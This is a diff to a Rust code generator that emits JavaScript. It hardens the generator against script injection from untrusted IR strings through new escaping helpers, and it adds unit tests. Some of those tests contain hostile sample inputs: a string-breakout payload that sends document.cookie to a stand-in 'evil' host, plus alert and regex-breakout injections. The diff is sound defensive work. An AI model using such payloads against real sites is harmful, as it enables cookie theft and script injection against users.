@@ -5,6 +5,49 @@
 
 use crate::compiler_ir::{CompiledGestureHandler, CompiledStateMachine, CompilerIr};
 
+/// Encode a string as a safe JS string literal (double-quoted).
+///
+/// `serde_json` produces a valid double-quoted literal with control
+/// characters, quotes, and backslashes escaped; that literal is also a valid
+/// JS string. We additionally escape `<` as `<` (which is `<` in JS) so a
+/// value containing `</script>` cannot terminate the `<script>` element at HTML
+/// parse time. IR strings are AI- or user-authored and must never be trusted
+/// as code.
+fn js_str(s: &str) -> String {
+    let json = serde_json::to_string(s).unwrap_or_else(|_| "\"\"".to_string());
+    json.replace('<', "\\u003c")
+}
+
+/// Sanitize an IR id into a safe JS identifier fragment. Any character that is
+/// not alphanumeric or `_` becomes `_`, and a leading digit is prefixed, so an
+/// id can never inject code where it is used as a variable name. Deterministic,
+/// so the same id maps to the same identifier at every use site.
+fn js_ident(s: &str) -> String {
+    let mut out: String = s
+        .chars()
+        .map(|c| {
+            if c.is_ascii_alphanumeric() || c == '_' {
+                c
+            } else {
+                '_'
+            }
+        })
+        .collect();
+    if out.chars().next().is_some_and(|c| c.is_ascii_digit()) {
+        out.insert(0, '_');
+    }
+    if out.is_empty() {
+        out.push('_');
+    }
+    out
+}
+
+/// Escape a string for use inside a double-quoted CSS attribute selector, so an
+/// id containing a quote cannot break out of the `[data-voce-id="..."]` value.
+fn css_attr_value(s: &str) -> String {
+    s.replace('\\', "\\\\").replace('"', "\\\"")
+}
+
 /// Generate the JavaScript for all interactive elements.
 /// Returns empty string if no interactivity is needed.
 pub fn emit_js(ir: &CompilerIr) -> String {
@@ -36,23 +79,23 @@ pub fn emit_js(ir: &CompilerIr) -> String {
 }
 
 fn emit_state_machine(js: &mut String, sm: &CompiledStateMachine) {
-    let var_name = sm.id.replace('-', "_");
+    let var_name = js_ident(&sm.id);
 
     // State variable
     js.push_str(&format!(
-        "const {var_name}={{current:'{}'}};",
-        sm.initial_state
+        "const {var_name}={{current:{}}};",
+        js_str(&sm.initial_state)
     ));
 
     // Transition table
     js.push_str(&format!("const {var_name}_t={{"));
     for state in &sm.states {
-        js.push_str(&format!("'{state}':{{"));
+        js.push_str(&format!("{}:{{", js_str(state)));
         for t in sm.transitions.iter().filter(|t| t.from == *state) {
-            js.push_str(&format!("'{}':", t.event));
-            js.push_str(&format!("{{to:'{}'", t.to));
+            js.push_str(&format!("{}:", js_str(&t.event)));
+            js.push_str(&format!("{{to:{}", js_str(&t.to)));
             if let Some(ref effect) = t.effect {
-                js.push_str(&format!(",fx:'{effect}'"));
+                js.push_str(&format!(",fx:{}", js_str(effect)));
             }
             js.push_str("},");
         }
@@ -67,7 +110,6 @@ fn emit_state_machine(js: &mut String, sm: &CompiledStateMachine) {
 }
 
 fn emit_gesture_handler(js: &mut String, gh: &CompiledGestureHandler) {
-    let target_id = &gh.target_node_id;
     let event_type = match gh.gesture_type.as_str() {
         "Tap" | "Click" => "click",
         "Hover" => "mouseenter",
@@ -75,34 +117,41 @@ fn emit_gesture_handler(js: &mut String, gh: &CompiledGestureHandler) {
         "DoubleTap" => "dblclick",
         _ => "click",
     };
+    let id = js_ident(&gh.id);
+    // The selector string is escaped for both the CSS attribute-value context
+    // (inner quote) and the JS string context (outer literal).
+    let selector = js_str(&format!(
+        "[data-voce-id=\"{}\"]",
+        css_attr_value(&gh.target_node_id)
+    ));
 
     // Find element by data-voce-id or by DOM structure
     js.push_str(&format!(
-        "  const el_{id}=document.querySelector('[data-voce-id=\"{target_id}\"]');\n",
-        id = gh.id.replace('-', "_")
+        "  const el_{id}=document.querySelector({selector});\n"
     ));
 
-    js.push_str(&format!("  if(el_{id}){{", id = gh.id.replace('-', "_")));
+    js.push_str(&format!("  if(el_{id}){{"));
 
     // Attach event listener
     if let Some(ref trigger_event) = gh.trigger_event {
         if let Some(ref sm_id) = gh.trigger_state_machine {
-            let sm_var = sm_id.replace('-', "_");
+            let sm_var = js_ident(sm_id);
             js.push_str(&format!(
-                "el_{id}.addEventListener('{event_type}',()=>{{{sm_var}_send('{trigger_event}')}});",
-                id = gh.id.replace('-', "_")
+                "el_{id}.addEventListener('{event_type}',()=>{{{sm_var}_send({})}});",
+                js_str(trigger_event)
             ));
         }
     }
 
     // Keyboard equivalent
     if let Some(ref key) = gh.keyboard_key {
-        let id_var = gh.id.replace('-', "_");
         if let Some(ref trigger_event) = gh.trigger_event {
             if let Some(ref sm_id) = gh.trigger_state_machine {
-                let sm_var = sm_id.replace('-', "_");
+                let sm_var = js_ident(sm_id);
                 js.push_str(&format!(
-                    "el_{id_var}.addEventListener('keydown',(e)=>{{if(e.key==='{key}'){{{sm_var}_send('{trigger_event}')}}}});"
+                    "el_{id}.addEventListener('keydown',(e)=>{{if(e.key==={}){{{sm_var}_send({})}}}});",
+                    js_str(key),
+                    js_str(trigger_event)
                 ));
             }
         }
@@ -113,10 +162,11 @@ fn emit_gesture_handler(js: &mut String, gh: &CompiledGestureHandler) {
 
 fn emit_form_validation(js: &mut String, form: &crate::compiler_ir::CompiledForm) {
     let form_id = &form.id;
-    let var = form_id.replace('-', "_");
+    let var = js_ident(form_id);
 
     js.push_str(&format!(
-        "  const {var}_form=document.getElementById('{form_id}');\n"
+        "  const {var}_form=document.getElementById({});\n",
+        js_str(form_id)
     ));
     js.push_str(&format!(
         "  if({var}_form){{{var}_form.addEventListener('submit',(e)=>{{\n"
@@ -125,13 +175,15 @@ fn emit_form_validation(js: &mut String, form: &crate::compiler_ir::CompiledForm
 
     for field in &form.fields {
         let field_id = format!("{form_id}-{}", field.name);
-        let field_var = field.name.replace('-', "_");
+        let field_var = js_ident(&field.name);
 
         js.push_str(&format!(
-            "    const {field_var}=document.getElementById('{field_id}');\n"
+            "    const {field_var}=document.getElementById({});\n",
+            js_str(&field_id)
         ));
         js.push_str(&format!(
-            "    const {field_var}_err=document.getElementById('{field_id}-error');\n"
+            "    const {field_var}_err=document.getElementById({});\n",
+            js_str(&format!("{field_id}-error"))
         ));
 
         for rule in &field.validations {
@@ -139,27 +191,112 @@ fn emit_form_validation(js: &mut String, form: &crate::compiler_ir::CompiledForm
                 "Required" => format!("!{field_var}.value.trim()"),
                 "Email" => format!("!/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test({field_var}.value)"),
                 "MinLength" => {
-                    let min = rule.value.as_deref().unwrap_or("1");
+                    // Bounds must be numeric — never interpolate a raw string
+                    // into an expression context.
+                    let min = rule
+                        .value
+                        .as_deref()
+                        .and_then(|v| v.parse::<u64>().ok())
+                        .unwrap_or(1);
                     format!("{field_var}.value.length<{min}")
                 }
                 "MaxLength" => {
-                    let max = rule.value.as_deref().unwrap_or("255");
+                    let max = rule
+                        .value
+                        .as_deref()
+                        .and_then(|v| v.parse::<u64>().ok())
+                        .unwrap_or(255);
                     format!("{field_var}.value.length>{max}")
                 }
                 "Pattern" => {
+                    // Build the regex via `new RegExp(<escaped-string>)` rather
+                    // than a `/.../ ` literal, which a value containing `/` or a
+                    // newline could break out of.
                     let pat = rule.value.as_deref().unwrap_or(".*");
-                    format!("!/{pat}/.test({field_var}.value)")
+                    format!("!new RegExp({}).test({field_var}.value)", js_str(pat))
                 }
                 _ => continue,
             };
 
-            let msg = rule.message.replace('\'', "\\'");
             js.push_str(&format!(
-                "    if({check}){{{field_var}_err.textContent='{msg}';{field_var}_err.hidden=false;valid=false;}}else{{{field_var}_err.hidden=true;}}\n"
+                "    if({check}){{{field_var}_err.textContent={};{field_var}_err.hidden=false;valid=false;}}else{{{field_var}_err.hidden=true;}}\n",
+                js_str(&rule.message)
             ));
         }
     }
 
     js.push_str("    if(!valid){e.preventDefault();}\n");
     js.push_str("  })}\n");
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn js_str_escapes_quotes_and_backslashes() {
+        assert_eq!(js_str(r#"a"b"#), r#""a\"b""#);
+        assert_eq!(js_str(r"a\b"), r#""a\\b""#);
+        // A closing-tag sequence must not survive as literal "</script".
+        assert!(!js_str("</script>").contains("</script"));
+        assert!(js_str("</script>").contains("\\u003c"));
+    }
+
+    #[test]
+    fn js_str_neutralizes_breakout_attempt() {
+        // A hostile state name / message that tries to close the string and
+        // inject code stays inside a single escaped literal.
+        let hostile = "x';fetch('//evil'+document.cookie);'";
+        let out = js_str(hostile);
+        assert!(out.starts_with('"') && out.ends_with('"'));
+        // No unescaped single-quote-driven breakout is possible; the payload is
+        // one contiguous double-quoted literal.
+        assert!(!out.contains("');"));
+    }
+
+    #[test]
+    fn js_ident_strips_non_identifier_chars() {
+        assert_eq!(js_ident("btn-1"), "btn_1");
+        assert_eq!(js_ident("a;alert(1);b"), "a_alert_1__b");
+        assert_eq!(js_ident("9lives"), "_9lives");
+        assert_eq!(js_ident(""), "_");
+    }
+
+    #[test]
+    fn css_attr_value_escapes_quote() {
+        assert_eq!(css_attr_value(r#"a"b"#), r#"a\"b"#);
+    }
+
+    #[test]
+    fn pattern_rule_uses_regexp_constructor() {
+        use crate::compiler_ir::{CompiledForm, CompiledFormField, CompiledValidationRule};
+        let form = CompiledForm {
+            id: "f".into(),
+            fields: vec![CompiledFormField {
+                name: "u".into(),
+                field_type: "text".into(),
+                label: "U".into(),
+                placeholder: None,
+                autocomplete: None,
+                validations: vec![CompiledValidationRule {
+                    rule_type: "Pattern".into(),
+                    // A pattern that would break out of a /.../ literal.
+                    value: Some("/;fetch('x');/".into()),
+                    message: "bad".into(),
+                }],
+                description: None,
+                options: vec![],
+                style: None,
+            }],
+            action_endpoint: None,
+            action_method: "post".into(),
+            progressive: false,
+            layout: None,
+        };
+        let mut js = String::new();
+        emit_form_validation(&mut js, &form);
+        assert!(js.contains("new RegExp("));
+        // The raw slash-delimited payload must not appear as a bare regex literal.
+        assert!(!js.contains("!//;fetch"));
+    }
 }
